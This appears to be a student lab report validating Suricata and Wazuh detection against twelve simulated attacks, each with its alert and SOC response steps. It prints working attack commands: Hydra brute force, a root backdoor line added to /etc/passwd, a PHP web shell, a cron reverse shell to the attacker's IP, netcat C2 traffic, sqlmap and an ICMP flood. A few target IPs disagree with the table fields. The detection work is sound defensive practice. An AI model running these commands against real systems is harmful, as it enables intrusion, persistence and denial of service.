# 📊 Attack Validation Report

**Lab Environment | March 2026**  
**Suricata 8.0.3 + Wazuh SIEM Integration**

---

## Executive Summary

This document records all 12 controlled attack simulations conducted to validate the Suricata IDS and Wazuh SIEM integration. Each test includes the tool, command, expected detection, actual alert fired, and the recommended SOC analyst response.

**Result: 12/12 attacks detected. 100% detection rate.**

---

## Results Overview

| # | Attack | Tool | Expected Rule | Actual Rule | Status |
|:---:|---|---|---|---|:---:|
| 1 | SSH Brute-Force | Hydra | ET SCAN SSH Brute Force | `5763` | ✅ |
| 2 | RDP Brute-Force | Hydra | ET SCAN RDP Brute Force | `100100` | ✅ |
| 3 | TCP SYN Port Scan | Nmap -sS | ET SCAN sid:2009582 | `sid:2010935` → `86601` | ✅ |
| 4 | Service Version Enum | Nmap -sV | ET SCAN sid:2010935 | `sid:2010935` → `86601` | ✅ |
| 5 | `/etc/passwd` Modification | SSH/Bash | Integrity check fails | `550` | ✅ |
| 6 | Web Shell Upload | PowerShell | Rule 554 | `554` | ✅ |
| 7 | Malicious Cron Job | SSH/Bash | Cron modification | `2832` | ✅ |
| 8 | EICAR Test File | PowerShell | Rule 87105 | `62138` | ✅ |
| 9 | Encoded PowerShell | PowerShell | Rules 61603, 92200 | `92057`, `92213` | ✅ |
| 10 | Netcat C2 (IRC) | Netcat | ET POLICY / Rule 533 | `86601` | ✅ |
| 11 | SQL Injection (DVWA) | SQLmap | ET WEB_SERVER sid:2006446 | `sid:2006446` + 3 bonus | ✅ |
| 12 | ICMP Flood & Ping Sweep | hping3/Nmap | sid:2100469, 2200074 | `sid:2100366` | ✅ |

---

## Detailed Test Cases

---

### Test 1 — SSH Brute-Force Attack

| Field | Details |
|---|---|
| **Attack Tool** | Hydra |
| **Source IP** | `192.168.0.159` (Debian WSL) |
| **Destination IP** | `192.168.1.151` (Victim) |
| **Expected Rule** | ET SCAN Potential SSH Scan / SSH Brute Force |
| **Actual Alert** | `sid:5763` — sshd: brute force trying to get access. Authentication failed |
| **Category** | `syslog`, `sshd`, `authentication_failures` |
| **Severity** | 🔴 High (Level 10) |
| **ATT&CK** | T1110.001 — Brute Force: Password Guessing |

**Command Used:**
```bash
hydra -l root -P rockyou.txt ssh://192.168.0.152 -t 4 -V
```

**Recommended SOC Analyst Response:**
1. **Block Attacker IP** — Drop all traffic from `192.168.0.159` at the firewall immediately
2. **Audit Success** — Search logs for any `Accepted password` events from that source IP
3. **Disable Root Login** — Update SSH config: `PermitRootLogin no`
4. **Enable Fail2Ban** — Implement automated blocking for IPs with multiple failures

---

### Test 2 — RDP Brute-Force Attack

| Field | Details |
|---|---|
| **Attack Tool** | Hydra |
| **Source IP** | `192.168.0.159` (Debian WSL) |
| **Destination IP** | `192.168.1.151` (Victim) |
| **Expected Rule** | ET SCAN Potential RDP Scan / Brute Force (Port 3389) |
| **Actual Alert** | `sid:100100` — RDP Attack Detected |
| **Category** | `rdp` |
| **Severity** | 🔴 High (Level 10) |
| **ATT&CK** | T1110.003 — Brute Force: Password Spraying |

**Command Used:**
```bash
hydra -l Administrator -P rockyou.txt rdp://192.168.0.152 -t 4 -V
```

**Recommended SOC Analyst Response:**
1. **Block Attacker IP** — Drop all traffic from `192.168.0.159`
2. **Audit Success** — Check Windows Event ID `4624` for successful logon from source IP
3. **Disable Admin** — Rename or disable the default `Administrator` account
4. **Enable Lockouts** — Implement Windows Account Lockout Policy

---

### Test 3 — TCP SYN Port Scan

| Field | Details |
|---|---|
| **Attack Tool** | Nmap |
| **Source IP** | `192.168.1.131` (Kali) |
| **Destination IP** | `192.168.1.130:1433` (Victim) |
| **Expected Rule** | ET SCAN sid:2009582 |
| **Actual Alert** | `sid:2010935` — ET SCAN Suspicious inbound to MSSQL port 1433 (`rule.id: 86601`) |
| **Category** | Potentially Bad Traffic |
| **Severity** | 🟡 Medium (Level 2 Suricata) |
| **ATT&CK** | T1046 — Network Service Discovery |

**Command Used:**
```bash
sudo nmap -sS 192.168.1.130
```

**Recommended SOC Analyst Response:**
1. Identify whether the source IP is a known or authorized scanner
2. Review all ports probed to identify targeted services
3. Block unauthorized scanning hosts at the firewall
4. Correlate with other alerts for follow-up exploitation attempts
5. Escalate if source IP is external or unknown

---

### Test 4 — Service Version Enumeration Scan

| Field | Details |
|---|---|
| **Attack Tool** | Nmap |
| **Source IP** | `192.168.1.131` (Kali) |
| **Destination IP** | `192.168.1.130:1433` (Victim) |
| **Expected Rule** | `sid:2010935` — ET SCAN Suspicious inbound to MSSQL 1433 |
| **Actual Alert** | `sid:2010935` → `rule.id: 86601` |
| **Category** | Potentially Bad Traffic |
| **Severity** | 🟡 Medium (Level 2) |
| **ATT&CK** | T1046 — Network Service Discovery |

**Command Used:**
```bash
sudo nmap -sV 192.168.1.130
```

**Recommended SOC Analyst Response:**
1. Identify all services exposed and assess risk
2. Disable unnecessary services or move to non-standard ports
3. Implement rate limiting or port-knock mechanisms
4. Block attacker IP at perimeter firewall immediately
5. Document exposed services and compare against approved list

---

### Test 5 — Unauthorized `/etc/passwd` Modification

| Field | Details |
|---|---|
| **Attack Tool** | SSH / Bash |
| **Source IP** | `192.168.0.159` (Debian WSL) |
| **Destination IP** | `192.168.1.151` (Victim) |
| **Expected Rule** | FIM integrity check |
| **Actual Alert** | `sid:550` — Integrity checksum changed |
| **Category** | `ossec`, `syscheck`, `syscheck_entry_modified` |
| **Severity** | 🟠 Suspicious/Warning (Level 7) |
| **ATT&CK** | T1136.001 — Create Account: Local Account |

**Command Used:**
```bash
ssh root@192.168.1.151 'echo "malicious_user:x:0:0::/root:/bin/bash" >> /etc/passwd'
```

**Recommended SOC Analyst Response:**
1. **Identify Modified File** — Review Wazuh FIM alert for exact file alteration details
2. **Isolate Endpoint** — Disconnect victim VM from network to prevent lateral movement
3. **Restore Integrity** — Revert modification from trusted backup or manually remove injected entry
4. **Audit Access** — Check `/var/log/auth.log` for how attacker authenticated

---

### Test 6 — Web Shell Upload

| Field | Details |
|---|---|
| **Attack Tool** | PowerShell `Set-Content` |
| **Expected Rule** | Rule `554` — File added to the system |
| **Actual Alert** | `554` |
| **Rule Level** | Level 5 |
| **ATT&CK** | T1505.003 — Server Software Component: Web Shell |

**Command Used:**
```powershell
Set-Content -Path "C:\inetpub\wwwroot\shell.php" -Value '<?php echo shell_exec($_GET["cmd"]); ?>'
```

**Recommended SOC Analyst Response:**
1. Immediately isolate the affected web server
2. Identify who/what created the file (check parent process)
3. Delete the web shell and scan for others in the web directory
4. Review web server access logs for any requests to the shell
5. Check for lateral movement or persistence mechanisms

---

### Test 7 — Malicious Cron Job Entry

| Field | Details |
|---|---|
| **Attack Tool** | SSH / Bash |
| **Source IP** | `192.168.0.159` (Debian WSL) |
| **Destination IP** | `192.168.1.151` (Victim) |
| **Expected Rule** | Suspicious cron entry / FIM cron modification |
| **Actual Alert** | `sid:2832` — Crontab entry changed |
| **Category** | `syslog`, `cron` |
| **Severity** | 🟡 Medium (Level 5) |
| **ATT&CK** | T1053.003 — Scheduled Task/Job: Cron |

**Command Used:**
```bash
ssh root@192.168.1.151 '(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c '\''bash -i >& /dev/tcp/192.168.0.159/4444 0>&1'\''") | crontab -'
```

**Recommended SOC Analyst Response:**
1. Block attacker IP `192.168.0.159` and terminate active sessions
2. Quarantine `192.168.1.151`; preserve volatile evidence (memory, running processes)
3. Collect forensic artifacts: crontabs, related logs, compute hashes
4. Remove malicious cron entry, scan for other persistence, rotate credentials; rebuild if compromise confirmed

---

### Test 8 — EICAR Test File

| Field | Details |
|---|---|
| **Attack Tool** | PowerShell `Set-Content` |
| **Expected Rule** | `87105` — VirusTotal: Alert |
| **Actual Alert** | `62138` |
| **Rule Level** | Level 3 |
| **Note** | Detected via FIM before VirusTotal integration; both are valid detection paths |
| **ATT&CK** | T1204.002 — User Execution: Malicious File |

**Command Used:**
```powershell
Set-Content -Path "C:\Users\Public\eicar.com" -Value 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
```

**Recommended SOC Analyst Response:**
1. Verify if Windows Defender quarantined the file
2. If `87105` had fired, escalate immediately as confirmed malware
3. Cross-reference file hash against threat intelligence feeds
4. Investigate how the file arrived on the system
5. Check for other suspicious files in the same directory

---

### Test 9 — Suspicious Encoded PowerShell

| Field | Details |
|---|---|
| **Attack Tool** | PowerShell `-EncodedCommand` flag |
| **Expected Rules** | `61603` and `92200` |
| **Actual Rules Fired** | `92057` (base64 encoded command), `92213` |
| **Rule Level** | Level 12 |
| **ATT&CK** | T1027.010 — Obfuscated Files or Info: Command Obfuscation |

**Command Used:**
```powershell
powershell.exe -EncodedCommand "VwByAGkAdABlAC0ASABvAHMAdAAgACcAVABlAHMAdAAnAA=="
# Decoded: Write-Host 'Test'
```

**Recommended SOC Analyst Response:**
1. Treat Level 12+ as high priority — respond promptly
2. Decode the base64 command to inspect actual payload
3. Identify the user account that ran the command
4. Check if any files were dropped or network connections made
5. Review full PowerShell script block logging for context
6. Consider isolating the endpoint pending investigation

---

### Test 10 — Netcat C2 Channel Simulation

| Field | Details |
|---|---|
| **Attack Tool** | Netcat (nc) |
| **Source IP** | `192.168.1.131` (Kali) |
| **Destination IP** | `192.168.1.130:6667` (Victim) |
| **Expected Rule** | ET POLICY / Wazuh Rule 533 — IRC C2 |
| **Actual Alert** | `rule.id: 86601` — ET CHAT IRC NICK / USER / JOIN / PRIVMSG |
| **Category** | Potential Corporate Privacy Violation / C2 |
| **Severity** | 🟡 Medium (Level 3 Suricata) |
| **ATT&CK** | T1071 — Application Layer Protocol |

**Commands Used:**
```bash
# Victim (listener)
nc -lvnp 6667

# Kali (attacker)
printf 'NICK evilbot\r\nUSER evilbot 0 * :evil\r\nJOIN #c2\r\n' | nc 192.168.1.130 6667
```

**Recommended SOC Analyst Response:**
1. Immediately block all outbound IRC traffic (port 6667) at the firewall
2. Identify the process on the victim that established the connection
3. Isolate the compromised host from the network
4. Capture and preserve network traffic for forensic analysis
5. Scan host for malware, backdoors, or persistence mechanisms

---

### Test 11 — SQL Injection via DVWA

| Field | Details |
|---|---|
| **Attack Tool** | SQLmap |
| **Source IP** | `192.168.1.131` (Kali) |
| **Destination IP** | `192.168.1.130:80/dvwa` (Victim) |
| **Expected Rule** | `sid:2006446` — ET WEB_SERVER SQL Injection UNION SELECT |
| **Actual Alert** | `sid:2006446` ✅ + **3 bonus detections**: `sid:2053467`, `sid:2016935`, `sid:2221036` |
| **Category** | Web Application Attack |
| **Severity** | 🔴 Critical (Level 1 Suricata) |
| **ATT&CK** | T1190 — Exploit Public-Facing Application |

**Command Used:**
```bash
sqlmap -u "http://192.168.1.130/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session>;security=low" \
  --batch --level=3
```

**Bonus Detections:**
- `sid:2053467` — SQL Injection SELECT CAST
- `sid:2016935` — SQL Injection SELECT SLEEP Time Delay
- `sid:2221036` — SURICATA HTTP Response excessive header repetition

**Recommended SOC Analyst Response:**
1. Immediately block attacker IP at the WAF/firewall
2. Check database logs for unauthorized queries or data exfiltration
3. Audit web application code for all unsanitized SQL inputs
4. Apply parameterized queries / prepared statements to vulnerable pages
5. Review and rotate all database credentials
6. Enable WAF rules to block SQLmap user-agent strings

---

### Test 12 — ICMP Flood & Ping Sweep

| Field | Details |
|---|---|
| **Attack Tool** | hping3 / Nmap |
| **Source IP** | `192.168.1.131` (Kali) |
| **Destination IP** | `192.168.1.130` (Victim) |
| **Expected SIDs** | `2100469`, `2200074` |
| **Actual Alert** | `sid:2100366` — GPL ICMP PING \*NIX (`rule.id: 86601`) |
| **Traffic Volume** | 3,156,986 packets / 189MB in ~5 minutes |
| **Category** | Misc Activity / Volumetric Flood |
| **Severity** | 🟢 Informational (Level 3) |
| **ATT&CK** | T1498.001 — Network DoS: Direct Network Flood |

**Commands Used:**
```bash
sudo hping3 -1 --flood -V 192.168.1.130
sudo nmap -sn 192.168.1.0/24
```

**Recommended SOC Analyst Response:**
1. Apply rate limiting on ICMP traffic at the network perimeter
2. Block source IP using firewall rules immediately
3. Monitor CPU and bandwidth utilization for service degradation
4. Check if flood is part of a larger DDoS or distraction attack
5. Enable ICMP flood protection on the host firewall (ufw/iptables)

---

## Lab Environment

| Component | Details |
|---|---|
| **Victim Machine** | Ubuntu Server 24.04 · IP: `192.168.1.130` · Suricata 8.0.3 + Wazuh Agent |
| **Attacker Machine** | Kali Linux 2025.4 · IP: `192.168.1.131` |
| **Wazuh Manager** | Ubuntu Server · IP: `192.168.1.130` (ubuntuserver) |
| **DVWA** | Damn Vulnerable Web Application · Apache + PHP + MariaDB |
| **Suricata Rules** | 48,919 rules loaded · `EXTERNAL_NET: any` (LAN testing mode) |

---

*Report generated: March 2026 · CADT Cybersecurity Lab*
